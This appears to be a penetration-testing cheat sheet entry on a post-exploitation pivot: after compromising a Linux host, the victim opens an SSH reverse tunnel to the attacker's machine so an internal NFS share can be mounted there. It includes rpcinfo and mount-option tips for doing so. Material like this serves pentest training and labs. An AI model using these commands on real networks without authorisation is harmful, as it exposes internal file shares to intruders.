# Linux Post Methods

## Misc Tricks

### NFS Proxy Mount

tags: nfs, proxy, proxychains, mount, reverse tunnle, ssh

Mount internal NFS share through pivot:

After compromising a host as a low-priv user, if the system has access to local NFS shares, the shares can be mounted via a proxy. One method is to create a SSH proxy and mount the NFS share on the remote attack box. In the easiest of cases, the below is all that is required.

```
# victim
ssh -R 2049:$target_nfs_ip:2049 proxyusr@$atk_ip
# attacker
mount -t nfs -o port=2049 localhost:/share /mnt
```

As NFS uses multiple ports for protocol communication, and can make use of TCP or UDP, if the mount command fails, it is likely due to the `mountport` being unknown on the attacking system. This can be resolved by feeding the mount command the port manually. Run the following on the victim system to identify the port. 

```
rpcinfo -p $victim_nfs
```

Where the `mountd` port is the `mountport`, it can be fed to the mount command.

```
mount -t nfs -o port=2049,mountport=1234 localhost:/share /mnt
```

One may need to set the `-o proto=tcp` to ensure TCP is used. Or, the  NFS version may need to be set manually, such as `-o vers=3` or `-o vers=4`.